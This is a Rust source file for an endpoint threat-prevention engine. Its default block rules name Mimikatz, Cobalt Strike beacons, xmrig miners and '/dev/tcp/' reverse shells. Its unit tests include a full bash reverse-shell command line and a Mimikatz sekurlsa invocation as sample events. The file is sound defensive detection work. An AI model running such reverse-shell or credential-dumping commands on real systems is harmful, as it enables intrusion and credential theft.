// ── Real-Time Prevention Engine ──────────────────────────────────────────────
//
// Kernel-level blocking / inline prevention for high-confidence threats.
// Evaluates prevention policies against events and issues block decisions.

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::{Arc, Mutex};

// ── Prevention Policy ────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PreventionPolicy {
    pub id: String,
    pub name: String,
    pub enabled: bool,
    pub mode: PreventionMode,
    pub rules: Vec<PreventionRule>,
    pub created: DateTime<Utc>,
    pub updated: DateTime<Utc>,
    pub description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum PreventionMode {
    /// Log only, don't block
    Detect,
    /// Block and log
    Prevent,
    /// Block, log, and isolate endpoint
    Contain,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PreventionRule {
    pub id: String,
    pub name: String,
    pub condition: PreventionCondition,
    pub action: PreventionAction,
    pub severity: u8,
    pub confidence_threshold: f64,
    pub enabled: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum PreventionCondition {
    ProcessName(String),
    ProcessHash(String),
    NetworkDestination { ip: String, port: Option<u16> },
    FilePathPattern(String),
    RegistryKeyPattern(String),
    CommandLineContains(String),
    ParentChildChain { parent: String, child: String },
    Composite(Vec<PreventionCondition>),
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum PreventionAction {
    Block,
    Quarantine,
    Kill,
    NetworkIsolate,
    AlertOnly,
}

// ── Prevention Event ─────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PreventionEvent {
    pub timestamp: DateTime<Utc>,
    pub device_id: String,
    pub process_name: String,
    pub process_hash: Option<String>,
    pub command_line: String,
    pub parent_process: Option<String>,
    pub src_ip: Option<String>,
    pub dst_ip: Option<String>,
    pub dst_port: Option<u16>,
    pub file_path: Option<String>,
    pub user_name: String,
    pub confidence: f64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PreventionDecision {
    pub event: PreventionEvent,
    pub policy_id: String,
    pub rule_id: String,
    pub action: PreventionAction,
    pub blocked: bool,
    pub reason: String,
    pub decided_at: DateTime<Utc>,
}

// ── Prevention Engine ────────────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct PreventionEngine {
    policies: Arc<Mutex<HashMap<String, PreventionPolicy>>>,
    decisions: Arc<Mutex<Vec<PreventionDecision>>>,
    stats: Arc<Mutex<PreventionStats>>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct PreventionStats {
    pub events_evaluated: u64,
    pub events_blocked: u64,
    pub events_allowed: u64,
    pub events_quarantined: u64,
    pub false_positives_reported: u64,
}

impl PreventionEngine {
    pub fn new() -> Self {
        let engine = Self {
            policies: Arc::new(Mutex::new(HashMap::new())),
            decisions: Arc::new(Mutex::new(Vec::new())),
            stats: Arc::new(Mutex::new(PreventionStats::default())),
        };
        engine.load_default_policies();
        engine
    }

    fn load_default_policies(&self) {
        let now = Utc::now();
        let default_policy = PreventionPolicy {
            id: "default-prevention".into(),
            name: "Default Prevention Policy".into(),
            enabled: true,
            mode: PreventionMode::Prevent,
            rules: vec![
                PreventionRule {
                    id: "block-mimikatz".into(),
                    name: "Block Mimikatz".into(),
                    condition: PreventionCondition::ProcessName("mimikatz.exe".into()),
                    action: PreventionAction::Kill,
                    severity: 10,
                    confidence_threshold: 0.8,
                    enabled: true,
                },
                PreventionRule {
                    id: "block-cobalt-strike".into(),
                    name: "Block Cobalt Strike Beacon".into(),
                    condition: PreventionCondition::CommandLineContains("beacon".into()),
                    action: PreventionAction::Block,
                    severity: 10,
                    confidence_threshold: 0.9,
                    enabled: true,
                },
                PreventionRule {
                    id: "block-crypto-miner".into(),
                    name: "Block Crypto Miners".into(),
                    condition: PreventionCondition::CommandLineContains("xmrig".into()),
                    action: PreventionAction::Kill,
                    severity: 7,
                    confidence_threshold: 0.85,
                    enabled: true,
                },
                PreventionRule {
                    id: "block-reverse-shell".into(),
                    name: "Block Reverse Shell".into(),
                    condition: PreventionCondition::CommandLineContains("/dev/tcp/".into()),
                    action: PreventionAction::Block,
                    severity: 9,
                    confidence_threshold: 0.8,
                    enabled: true,
                },
            ],
            created: now,
            updated: now,
            description: "Built-in prevention rules for known attack tools".into(),
        };
        self.policies
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .insert(default_policy.id.clone(), default_policy);
    }

    pub fn evaluate(&self, event: &PreventionEvent) -> Vec<PreventionDecision> {
        let policies = self
            .policies
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        let mut decisions = Vec::new();

        let mut stats = self
            .stats
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        stats.events_evaluated += 1;

        for policy in policies.values() {
            if !policy.enabled {
                continue;
            }
            for rule in &policy.rules {
                if !rule.enabled || event.confidence < rule.confidence_threshold {
                    continue;
                }
                if self.matches_condition(&rule.condition, event) {
                    let blocked = policy.mode != PreventionMode::Detect;
                    let action = if blocked {
                        rule.action.clone()
                    } else {
                        PreventionAction::AlertOnly
                    };

                    if blocked {
                        stats.events_blocked += 1;
                        if action == PreventionAction::Quarantine {
                            stats.events_quarantined += 1;
                        }
                    } else {
                        stats.events_allowed += 1;
                    }

                    decisions.push(PreventionDecision {
                        event: event.clone(),
                        policy_id: policy.id.clone(),
                        rule_id: rule.id.clone(),
                        action,
                        blocked,
                        reason: format!("Matched rule: {}", rule.name),
                        decided_at: Utc::now(),
                    });
                }
            }
        }

        if decisions.is_empty() {
            stats.events_allowed += 1;
        }

        drop(stats);
        if !decisions.is_empty() {
            self.decisions
                .lock()
                .unwrap_or_else(std::sync::PoisonError::into_inner)
                .extend(decisions.clone());
        }
        decisions
    }

    fn matches_condition(&self, condition: &PreventionCondition, event: &PreventionEvent) -> bool {
        match condition {
            PreventionCondition::ProcessName(name) => {
                event.process_name.to_lowercase() == name.to_lowercase()
            }
            PreventionCondition::ProcessHash(hash) => {
                event.process_hash.as_deref() == Some(hash.as_str())
            }
            PreventionCondition::NetworkDestination { ip, port } => {
                let ip_match = event.dst_ip.as_deref() == Some(ip.as_str());
                let port_match = port.is_none() || event.dst_port == *port;
                ip_match && port_match
            }
            PreventionCondition::FilePathPattern(pattern) => event
                .file_path
                .as_deref()
                .is_some_and(|p| p.to_lowercase().contains(&pattern.to_lowercase())),
            PreventionCondition::RegistryKeyPattern(_) => false, // Not applicable to unix
            PreventionCondition::CommandLineContains(substr) => event
                .command_line
                .to_lowercase()
                .contains(&substr.to_lowercase()),
            PreventionCondition::ParentChildChain { parent, child } => {
                let parent_match = event
                    .parent_process
                    .as_deref()
                    .is_some_and(|p| p.to_lowercase().contains(&parent.to_lowercase()));
                let child_match = event
                    .process_name
                    .to_lowercase()
                    .contains(&child.to_lowercase());
                parent_match && child_match
            }
            PreventionCondition::Composite(conditions) => {
                conditions.iter().all(|c| self.matches_condition(c, event))
            }
        }
    }

    pub fn add_policy(&self, policy: PreventionPolicy) {
        self.policies
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .insert(policy.id.clone(), policy);
    }

    pub fn remove_policy(&self, policy_id: &str) -> Result<(), String> {
        self.policies
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .remove(policy_id)
            .ok_or("Policy not found".into())
            .map(|_| ())
    }

    pub fn list_policies(&self) -> Vec<PreventionPolicy> {
        self.policies
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .values()
            .cloned()
            .collect()
    }

    pub fn recent_decisions(&self, limit: usize) -> Vec<PreventionDecision> {
        let decisions = self
            .decisions
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        decisions.iter().rev().take(limit).cloned().collect()
    }

    pub fn stats(&self) -> PreventionStats {
        self.stats
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .clone()
    }

    pub fn report_false_positive(&self, _rule_id: &str) {
        self.stats
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .false_positives_reported += 1;
    }
}

impl Default for PreventionEngine {
    fn default() -> Self {
        Self::new()
    }
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn make_event(process: &str, cmdline: &str, confidence: f64) -> PreventionEvent {
        PreventionEvent {
            timestamp: Utc::now(),
            device_id: "srv-01".into(),
            process_name: process.into(),
            process_hash: None,
            command_line: cmdline.into(),
            parent_process: None,
            src_ip: Some("10.0.0.5".into()),
            dst_ip: None,
            dst_port: None,
            file_path: None,
            user_name: "admin".into(),
            confidence,
        }
    }

    #[test]
    fn test_block_mimikatz() {
        let engine = PreventionEngine::new();
        let event = make_event("mimikatz.exe", "mimikatz.exe sekurlsa", 0.95);
        let decisions = engine.evaluate(&event);
        assert!(!decisions.is_empty());
        assert!(decisions[0].blocked);
        assert_eq!(decisions[0].action, PreventionAction::Kill);
    }

    #[test]
    fn test_block_cobalt_strike() {
        let engine = PreventionEngine::new();
        let event = make_event("rundll32.exe", "rundll32.exe beacon.dll", 0.95);
        let decisions = engine.evaluate(&event);
        assert!(!decisions.is_empty());
        assert!(decisions[0].blocked);
    }

    #[test]
    fn test_allow_normal_process() {
        let engine = PreventionEngine::new();
        let event = make_event("notepad.exe", "notepad.exe readme.txt", 0.1);
        let decisions = engine.evaluate(&event);
        assert!(decisions.is_empty());
    }

    #[test]
    fn test_confidence_threshold() {
        let engine = PreventionEngine::new();
        // Low confidence should not trigger
        let event = make_event("mimikatz.exe", "", 0.5);
        let decisions = engine.evaluate(&event);
        assert!(decisions.is_empty());
    }

    #[test]
    fn test_detect_mode() {
        let engine = PreventionEngine::new();
        let now = Utc::now();
        let policy = PreventionPolicy {
            id: "detect-only".into(),
            name: "Detect Only".into(),
            enabled: true,
            mode: PreventionMode::Detect,
            rules: vec![PreventionRule {
                id: "detect-calc".into(),
                name: "Detect Calculator".into(),
                condition: PreventionCondition::ProcessName("calc.exe".into()),
                action: PreventionAction::Block,
                severity: 3,
                confidence_threshold: 0.5,
                enabled: true,
            }],
            created: now,
            updated: now,
            description: "Test policy".into(),
        };
        engine.add_policy(policy);
        let event = make_event("calc.exe", "", 0.9);
        let decisions = engine.evaluate(&event);
        let calc_decisions: Vec<_> = decisions
            .iter()
            .filter(|d| d.policy_id == "detect-only")
            .collect();
        assert_eq!(calc_decisions.len(), 1);
        assert!(!calc_decisions[0].blocked);
        assert_eq!(calc_decisions[0].action, PreventionAction::AlertOnly);
    }

    #[test]
    fn test_stats() {
        let engine = PreventionEngine::new();
        let event = make_event("mimikatz.exe", "", 0.95);
        engine.evaluate(&event);
        let normal = make_event("explorer.exe", "", 0.1);
        engine.evaluate(&normal);
        let s = engine.stats();
        assert_eq!(s.events_evaluated, 2);
        assert_eq!(s.events_blocked, 1);
        assert_eq!(s.events_allowed, 1);
    }

    #[test]
    fn test_reverse_shell_blocked() {
        let engine = PreventionEngine::new();
        let event = make_event("bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", 0.9);
        let decisions = engine.evaluate(&event);
        assert!(!decisions.is_empty());
        assert!(decisions[0].blocked);
    }

    #[test]
    fn test_remove_policy() {
        let engine = PreventionEngine::new();
        assert!(engine.remove_policy("default-prevention").is_ok());
        assert!(engine.list_policies().is_empty());
    }

    #[test]
    fn test_recent_decisions() {
        let engine = PreventionEngine::new();
        let event = make_event("mimikatz.exe", "", 0.95);
        engine.evaluate(&event);
        let recent = engine.recent_decisions(10);
        assert_eq!(recent.len(), 1);
    }
}
